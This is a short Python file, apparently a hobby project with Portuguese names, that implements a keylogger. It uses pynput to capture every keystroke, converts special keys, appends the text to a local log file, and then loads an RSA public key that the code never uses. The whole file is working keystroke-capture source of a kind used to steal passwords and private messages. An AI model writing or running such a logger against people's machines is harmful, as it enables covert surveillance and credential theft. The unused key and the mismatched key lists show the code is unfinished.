from pynput import keyboard
import rsa

def on_press(key):
    lista = [".enter",".tab",".space",".backspace",".esc"]
    punições = ["\n","\t"," "]
    text = ""
    if str(key)[:3] == "Key":
        for aa in lista:
            if str(key)[3:] == aa:
                if aa != ".backspace" and aa != ".esc":
                    text = punições[lista.index(aa)]
                elif aa ==  ".backspace":
                    text = "-1"
                elif aa == ".esc":
                    return False
    else:
        text += str(key).strip("'")
    escrever(text)
def escrever(text):
    with open('em_espera/keylogger/aaaa.txt',"a") as f:
        f.write(f"{text}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

with open("public.pem", "rb") as f:
    public_key = rsa.PublicKey.load_pkcs1(f.read())